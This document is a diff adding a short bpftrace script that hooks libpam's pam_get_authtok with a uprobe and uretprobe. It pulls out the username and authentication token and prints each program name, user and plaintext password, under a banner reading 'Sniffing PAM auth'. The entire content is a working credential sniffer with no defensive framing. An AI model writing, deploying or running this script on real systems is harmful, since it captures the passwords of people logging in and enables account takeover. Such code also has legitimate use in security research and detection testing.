@@ -1,0 +1,18 @@
+struct partial_pam_handle {
+  char *filler[6];
+  char *user;
+};
+
+BEGIN { printf("Sniffing PAM auth ...\n"); }
+
+uprobe:/usr/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok {
+  @user[tid] = ((struct partial_pam_handle *)arg0)->user;
+  @authtok[tid] = arg2;
+}
+
+uretprobe:/usr/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok /@user[tid]/ {
+  printf("program: %s, user: %s, pass: %s\n", comm, str(@user[tid]), str(*@authtok[tid]));
+
+  delete(@user[tid]);
+  delete(@authtok[tid]);
+}
